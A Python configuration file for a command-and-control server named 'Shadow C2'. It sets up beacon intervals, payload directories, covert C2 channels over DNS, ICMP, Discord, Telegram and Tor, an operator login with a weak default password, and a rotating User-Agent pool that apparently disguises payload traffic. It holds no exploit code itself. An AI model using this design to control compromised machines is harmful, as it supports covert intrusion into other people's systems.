#!/usr/bin/env python3
"""
Shadow C2 — Central Configuration
All values configurable via environment variables with sane defaults.
"""

import os
import secrets
import hashlib

# ---------------------------------------------------------------------------
# Paths
# ---------------------------------------------------------------------------
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DATA_DIR = os.path.join(BASE_DIR, "data")
PAYLOAD_OUTPUT_DIR = os.path.join(BASE_DIR, "payloads")
DOWNLOAD_DIR = os.path.join(BASE_DIR, "payloads", "downloads")
UPLOAD_DIR = os.path.join(BASE_DIR, "payloads", "uploads")
SSL_DIR = os.path.join(BASE_DIR, "ssl")
LOG_DIR = os.path.join(BASE_DIR, "logs")

for _d in (DATA_DIR, PAYLOAD_OUTPUT_DIR, DOWNLOAD_DIR, UPLOAD_DIR, SSL_DIR, LOG_DIR):
    os.makedirs(_d, exist_ok=True)

# ---------------------------------------------------------------------------
# Secret key — generated once, persisted to .secret
# ---------------------------------------------------------------------------
_SECRET_PATH = os.path.join(DATA_DIR, ".secret")

def _load_or_create_secret() -> str:
    if os.path.exists(_SECRET_PATH):
        with open(_SECRET_PATH, "r") as f:
            return f.read().strip()
    key = secrets.token_hex(32)
    with open(_SECRET_PATH, "w") as f:
        f.write(key)
    return key

SECRET_KEY = os.environ.get("SC2_SECRET_KEY", _load_or_create_secret())
MASTER_KEY = bytes.fromhex(hashlib.sha256(SECRET_KEY.encode()).hexdigest())  # 32 bytes

# ---------------------------------------------------------------------------
# Server
# ---------------------------------------------------------------------------
C2_HOST = os.environ.get("SC2_HOST", "0.0.0.0")
C2_PORT = int(os.environ.get("SC2_PORT", "8443"))
DEBUG = os.environ.get("SC2_DEBUG", "0") == "1"

# ---------------------------------------------------------------------------
# Database
# ---------------------------------------------------------------------------
DATABASE_PATH = os.path.join(DATA_DIR, "shadow_c2.db")

# ---------------------------------------------------------------------------
# SSL / TLS
# ---------------------------------------------------------------------------
SSL_CERT_PATH = os.path.join(SSL_DIR, "server.crt")
SSL_KEY_PATH = os.path.join(SSL_DIR, "server.key")

# ---------------------------------------------------------------------------
# Authentication (operator dashboard)
# ---------------------------------------------------------------------------
OPERATOR_USERNAME = os.environ.get("SC2_USERNAME", "operator")
OPERATOR_PASSWORD = os.environ.get("SC2_PASSWORD", "shadowc2")

# ---------------------------------------------------------------------------
# Encryption
# ---------------------------------------------------------------------------
AES_KEY_SIZE = 256  # bits
KEY_ROTATION_INTERVAL = int(os.environ.get("SC2_KEY_ROTATION", "3600"))  # seconds

# ---------------------------------------------------------------------------
# C2 Channels
# ---------------------------------------------------------------------------
HTTPS_ENABLED = True
HTTPS_PORT = C2_PORT

DNS_ENABLED = os.environ.get("SC2_DNS_ENABLED", "1") == "1"
DNS_PORT = int(os.environ.get("SC2_DNS_PORT", "5353"))
DNS_DOMAIN = os.environ.get("SC2_DNS_DOMAIN", "c2.example.com")

WS_ENABLED = True  # always on (same server)

ICMP_ENABLED = os.environ.get("SC2_ICMP_ENABLED", "0") == "1"  # needs root

# Social media C2
DISCORD_ENABLED = os.environ.get("SC2_DISCORD_ENABLED", "0") == "1"
DISCORD_BOT_TOKEN = os.environ.get("SC2_DISCORD_TOKEN", "")
DISCORD_CHANNEL_ID = os.environ.get("SC2_DISCORD_CHANNEL", "")

TELEGRAM_ENABLED = os.environ.get("SC2_TELEGRAM_ENABLED", "0") == "1"
TELEGRAM_BOT_TOKEN = os.environ.get("SC2_TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("SC2_TELEGRAM_CHAT", "")

# Tor
TOR_ENABLED = os.environ.get("SC2_TOR_ENABLED", "0") == "1"
TOR_SOCKS_HOST = os.environ.get("SC2_TOR_SOCKS_HOST", "127.0.0.1")
TOR_SOCKS_PORT = int(os.environ.get("SC2_TOR_SOCKS_PORT", "9050"))

# ---------------------------------------------------------------------------
# GeoIP
# ---------------------------------------------------------------------------
GEOIP_API_URL = "http://ip-api.com/json/{ip}"

# ---------------------------------------------------------------------------
# Beacon / session
# ---------------------------------------------------------------------------
BEACON_INTERVAL = int(os.environ.get("SC2_BEACON_INTERVAL", "30"))  # seconds
SESSION_TIMEOUT = int(os.environ.get("SC2_SESSION_TIMEOUT", "3600"))
DEAD_TIMEOUT = int(os.environ.get("SC2_DEAD_TIMEOUT", "7200"))
MAX_UPLOAD_SIZE = int(os.environ.get("SC2_MAX_UPLOAD", str(50 * 1024 * 1024)))  # 50 MB

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------
LOG_LEVEL = os.environ.get("SC2_LOG_LEVEL", "INFO")
LOG_FILE = os.path.join(LOG_DIR, "shadow_c2.log")

# ---------------------------------------------------------------------------
# User-Agent pool (for payload HTTP requests)
# ---------------------------------------------------------------------------
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
]
